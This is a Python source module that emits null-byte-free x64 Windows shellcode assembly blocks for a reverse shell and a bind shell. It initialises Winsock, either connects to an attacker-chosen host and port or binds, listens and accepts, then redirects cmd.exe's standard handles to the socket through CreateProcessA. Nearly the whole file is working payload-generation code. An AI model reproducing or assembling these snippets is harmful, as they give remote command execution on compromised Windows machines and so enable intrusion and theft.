"""
x64 assembly snippet blocks — Microsoft x64 ABI.

Register conventions (all snippets follow these):
    RSI   socket handle — set by wsa_socket_tcp / accept, consumed by bind/listen/accept/startupinfoa
    RDI   STARTUPINFOA pointer — set by startupinfoa blocks, consumed by createprocessa
    RBX   command string pointer — set by cmd_string, consumed by createprocessa

Calling convention reminders applied throughout:
  - First four args: RCX, RDX, R8, R9
  - Shadow space: 32 bytes (0x20) reserved below args before every CALL
  - Stack args beyond four: at [rsp+0x20], [rsp+0x28], ...
  - RSP must be 16-byte aligned before every CALL
  - Callee does NOT clean stack — caller cleans its own sub rsp
  - No pushad/popad — snippet saves/restores explicitly where needed

Stack pairing contract:
  snippet_sockaddr_bind   — sub rsp, 0x10 (NOT cleaned here)
  snippet_bind_listen_accept — ... add rsp, 0x10 at the end (paired cleanup)

  SNIPPET_CMD_STRING      — sub rsp, 0x10 (NOT cleaned; process terminates after use)
  SNIPPET_STARTUPINFOA_*  — sub rsp, 0x70 (NOT cleaned; process terminates after use)
"""

from shellcode.encoding import encode_ip, encode_port


def _slot(offset: int) -> str:
    """Format an integer slot offset as an assembly memory operand."""
    if offset < 0:
        return f'rbp-{hex(-offset)}'
    return f'rbp+{hex(offset)}'


# ── Static snippets ────────────────────────────────────────────────────────────

SNIPPET_STARTUPINFOA_SOCKET = """\
create_startupinfoa:
    ; Allocate 0x70 bytes: STARTUPINFOA is 0x68, +0x08 for 16-byte alignment
    sub   rsp, 0x70
    xor   rax, rax
    ; Zero the entire structure (14 qwords)
    mov   [rsp+0x00], rax
    mov   [rsp+0x08], rax
    mov   [rsp+0x10], rax
    mov   [rsp+0x18], rax
    mov   [rsp+0x20], rax
    mov   [rsp+0x28], rax
    mov   [rsp+0x30], rax
    mov   [rsp+0x38], rax
    mov   [rsp+0x40], rax
    mov   [rsp+0x48], rax
    mov   [rsp+0x50], rax
    mov   [rsp+0x58], rax
    mov   [rsp+0x60], rax
    mov   [rsp+0x68], rax
    ; cb = 0x68 (sizeof STARTUPINFOA in x64) — 0x68 has no null bytes
    mov   byte ptr [rsp+0x00], 0x68
    ; dwFlags = STARTF_USESTDHANDLES (0x00000100)
    ; LE bytes: 00 01 00 00 — write only the non-zero byte at offset +0x3D
    mov   byte ptr [rsp+0x3d], 0x01
    ; hStdInput / hStdOutput / hStdError = RSI (socket handle)
    mov   [rsp+0x50], rsi
    mov   [rsp+0x58], rsi
    mov   [rsp+0x60], rsi
    lea   rdi, [rsp]                 ; RDI = &STARTUPINFOA"""

SNIPPET_STARTUPINFOA_NULL = """\
create_startupinfoa:
    sub   rsp, 0x70
    xor   rax, rax
    mov   [rsp+0x00], rax
    mov   [rsp+0x08], rax
    mov   [rsp+0x10], rax
    mov   [rsp+0x18], rax
    mov   [rsp+0x20], rax
    mov   [rsp+0x28], rax
    mov   [rsp+0x30], rax
    mov   [rsp+0x38], rax
    mov   [rsp+0x40], rax
    mov   [rsp+0x48], rax
    mov   [rsp+0x50], rax
    mov   [rsp+0x58], rax
    mov   [rsp+0x60], rax
    mov   [rsp+0x68], rax
    mov   byte ptr [rsp+0x00], 0x68  ; cb = sizeof(STARTUPINFOA)
    ; dwFlags = 0, all handles NULL (already zeroed)
    lea   rdi, [rsp]                 ; RDI = &STARTUPINFOA"""

SNIPPET_CMD_STRING = """\
create_cmd_string:
    sub   rsp, 0x10                  ; 16-byte aligned space for "cmd.exe\\x00"
    xor   rax, rax
    mov   eax, 0xff9a879b            ; negated encoding — no null bytes
    neg   eax                        ; EAX = 0x00657865 = "exe\\x00"
    mov   dword ptr [rsp+0x04], eax  ; write "exe\\x00" at +4
    mov   dword ptr [rsp+0x00], 0x2e646d63  ; write "cmd." at +0
    mov   rbx, rsp                   ; RBX = "cmd.exe\\x00\""""


# ── Parameterized snippets ─────────────────────────────────────────────────────

def snippet_createprocessa(slot: int) -> str:
    """
    Call CreateProcessA("cmd.exe") with STARTUPINFOA and inherit handles.

    Requires: RBX = "cmd.exe", RDI = &STARTUPINFOA
    Stack layout inside this snippet (sub rsp, 0x80):
        [rsp+0x00..0x1F]  shadow space
        [rsp+0x20]        bInheritHandles = 1
        [rsp+0x28]        dwCreationFlags = 0
        [rsp+0x30]        lpEnvironment = NULL
        [rsp+0x38]        lpCurrentDirectory = NULL
        [rsp+0x40]        lpStartupInfo = RDI
        [rsp+0x48]        lpProcessInformation → [rsp+0x58]
        [rsp+0x50..0x6F]  PROCESS_INFORMATION buffer (zeroed)
    """
    return f"""\
call_createprocessa:
    sub   rsp, 0x80                  ; shadow + stack args + PI buffer + padding
    xor   rax, rax
    ; Zero PROCESS_INFORMATION buffer at [rsp+0x58]
    mov   [rsp+0x58], rax
    mov   [rsp+0x60], rax
    mov   [rsp+0x68], rax
    ; Stack args
    inc   rax
    mov   [rsp+0x20], rax            ; bInheritHandles = TRUE
    xor   rax, rax
    mov   [rsp+0x28], rax            ; dwCreationFlags = 0
    mov   [rsp+0x30], rax            ; lpEnvironment = NULL
    mov   [rsp+0x38], rax            ; lpCurrentDirectory = NULL
    mov   [rsp+0x40], rdi            ; lpStartupInfo = &STARTUPINFOA
    lea   rax, [rsp+0x58]
    mov   [rsp+0x48], rax            ; lpProcessInformation (PI buffer)
    ; Register args
    xor   rcx, rcx                   ; lpApplicationName = NULL
    mov   rdx, rbx                   ; lpCommandLine = "cmd.exe"
    xor   r8, r8                     ; lpProcessAttributes = NULL
    xor   r9, r9                     ; lpThreadAttributes = NULL
    call  qword ptr [{_slot(slot)}]  ; CreateProcessA
    add   rsp, 0x80"""


def snippet_terminateprocess(slot: int) -> str:
    """
    Call TerminateProcess(INVALID_HANDLE_VALUE, 0).
    `xor rcx,rcx / dec rcx` produces -1 (current process) without null bytes.
    """
    return f"""\
call_terminateprocess:
    xor   rcx, rcx
    dec   rcx                        ; RCX = -1 = INVALID_HANDLE_VALUE (current process)
    xor   rdx, rdx                   ; uExitCode = 0
    sub   rsp, 0x20
    call  qword ptr [{_slot(slot)}]  ; TerminateProcess
    add   rsp, 0x20"""


def snippet_wsa_init(slot: int) -> str:
    """
    Call WSAStartup(2.2, lpWSAData).
    WSADATA buffer placed at [rbp-0x190] — well below the slot area.
    """
    return f"""\
call_wsastartup:
    lea   rdx, [rbp-0x190]           ; lpWSAData buffer (below slot area)
    xor   rcx, rcx
    mov   cx, 0x0202                 ; wVersionRequired = 2.2
    sub   rsp, 0x20
    call  qword ptr [{_slot(slot)}]  ; WSAStartup
    add   rsp, 0x20"""


def snippet_wsa_socket_tcp(slot: int) -> str:
    """
    Call WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0).
    Result (socket handle) saved to RSI.
    g and dwFlags (5th/6th args) are zeroed via RAX on the stack.
    """
    return f"""\
call_wsasocketa:
    xor   rcx, rcx
    mov   cl, 0x02                   ; af = AF_INET
    xor   rdx, rdx
    inc   rdx                        ; type = SOCK_STREAM
    xor   r8, r8
    mov   r8b, 0x06                  ; protocol = IPPROTO_TCP
    xor   r9, r9                     ; lpProtocolInfo = NULL
    sub   rsp, 0x30                  ; shadow (0x20) + g + dwFlags (0x10)
    xor   rax, rax
    mov   [rsp+0x20], rax            ; g = 0
    mov   [rsp+0x28], rax            ; dwFlags = 0
    call  qword ptr [{_slot(slot)}]  ; WSASocketA -> RAX = socket
    add   rsp, 0x30
    mov   rsi, rax                   ; RSI = socket handle"""


def snippet_sockaddr_bind(port: int) -> str:
    """
    Build sockaddr_in for 0.0.0.0:<port> on the stack.
    RSI must already hold the socket handle (set by snippet_wsa_socket_tcp).
    After this snippet: RDI = &sockaddr_in.

    Stack contract: sub rsp, 0x10 here — NOT cleaned up.
    snippet_bind_listen_accept adds rsp, 0x10 at its end (paired).
    """
    port_enc, port_warn = encode_port(port)
    warn = f'    ; WARNING: port {port} produces a null byte\n' if port_warn else ''
    return f"""\
create_sockaddr_bind:
    sub   rsp, 0x10                  ; space for sockaddr_in (16 bytes)
    xor   rax, rax
    mov   [rsp], rax                 ; zero first 8 bytes
    mov   [rsp+0x08], rax            ; zero next 8 bytes
    ; Build sin_family | sin_port as dword at [rsp+0x00]:
    ;   high 16 bits = port (network byte order), low 16 bits = AF_INET (2)
{warn}    mov   ax, {hex(port_enc)}                ; port {port} in network byte order
    shl   eax, 0x10
    add   ax, 0x02                   ; AF_INET
    mov   dword ptr [rsp], eax       ; sin_family + sin_port
    ; sin_addr = 0.0.0.0 (already zeroed at [rsp+0x04])
    lea   rdi, [rsp]                 ; RDI = &sockaddr_in"""


def snippet_bind_listen_accept(bind_slot: int,
                                listen_slot: int,
                                accept_slot: int) -> str:
    """
    Call bind(RSI, RDI, 16) → listen(RSI, 0) → accept(RSI, NULL, NULL).
    After accept: RSI = accepted client socket.
    Cleans sockaddr_in from stack at the end (add rsp, 0x10).
    """
    return f"""\
call_bind:
    mov   rcx, rsi                   ; s = socket
    mov   rdx, rdi                   ; addr = &sockaddr_in
    xor   r8, r8
    mov   r8b, 0x10                  ; namelen = sizeof(sockaddr_in)
    sub   rsp, 0x20
    call  qword ptr [{_slot(bind_slot)}]    ; bind
    add   rsp, 0x20
call_listen:
    mov   rcx, rsi                   ; s = socket
    xor   rdx, rdx                   ; backlog = 0
    sub   rsp, 0x20
    call  qword ptr [{_slot(listen_slot)}]  ; listen
    add   rsp, 0x20
call_accept:
    mov   rcx, rsi                   ; s = socket
    xor   rdx, rdx                   ; addr = NULL
    xor   r8, r8                     ; addrlen = NULL
    sub   rsp, 0x20
    call  qword ptr [{_slot(accept_slot)}]  ; accept -> RAX = client socket
    add   rsp, 0x20
    mov   rsi, rax                   ; RSI = accepted socket handle
    add   rsp, 0x10                  ; clean sockaddr_in (paired with snippet_sockaddr_bind)"""


def snippet_wsaconnect(lhost: str, lport: int, slot: int) -> str:
    """
    Build sockaddr_in for <lhost>:<lport> on the stack and call WSAConnect.
    RSI must already hold the socket handle.

    sockaddr_in is allocated AND cleaned within this snippet (fully self-contained).
    """
    ip_val,   ip_warn   = encode_ip(lhost)
    port_enc, port_warn = encode_port(lport)
    ip_note   = f'    ; WARNING: {lhost} contains a zero octet — null byte in push\n' if ip_warn   else ''
    port_note = f'    ; WARNING: port {lport} produces a null byte\n'                 if port_warn else ''
    return f"""\
call_wsaconnect:
    sub   rsp, 0x10                  ; space for sockaddr_in (16 bytes)
    xor   rax, rax
    mov   [rsp], rax
    mov   [rsp+0x08], rax
    ; sin_addr = {lhost}
{ip_note}    mov   eax, {hex(ip_val)}          ; {lhost} little-endian → network order at [rsp+4]
    mov   dword ptr [rsp+0x04], eax
    ; sin_family | sin_port as dword
{port_note}    mov   ax, {hex(port_enc)}                ; port {lport} (network byte order)
    shl   eax, 0x10
    add   ax, 0x02                   ; AF_INET
    mov   dword ptr [rsp], eax       ; sin_family + sin_port
    ; WSAConnect(s, &sockaddr, 16, NULL, NULL, NULL, NULL)
    mov   rcx, rsi                   ; s = socket
    lea   rdx, [rsp]                 ; &sockaddr_in (valid even after rsp sub below)
    xor   r8, r8
    mov   r8b, 0x10                  ; namelen = 16
    xor   r9, r9                     ; lpCallerData = NULL
    sub   rsp, 0x38                  ; shadow (0x20) + lpCalleeData,lpSQOS,lpGQOS (0x18)
    xor   rax, rax
    mov   [rsp+0x20], rax            ; lpCalleeData = NULL
    mov   [rsp+0x28], rax            ; lpSQOS = NULL
    mov   [rsp+0x30], rax            ; lpGQOS = NULL
    call  qword ptr [{_slot(slot)}]  ; WSAConnect
    add   rsp, 0x38                  ; restore args
    add   rsp, 0x10                  ; clean sockaddr_in"""
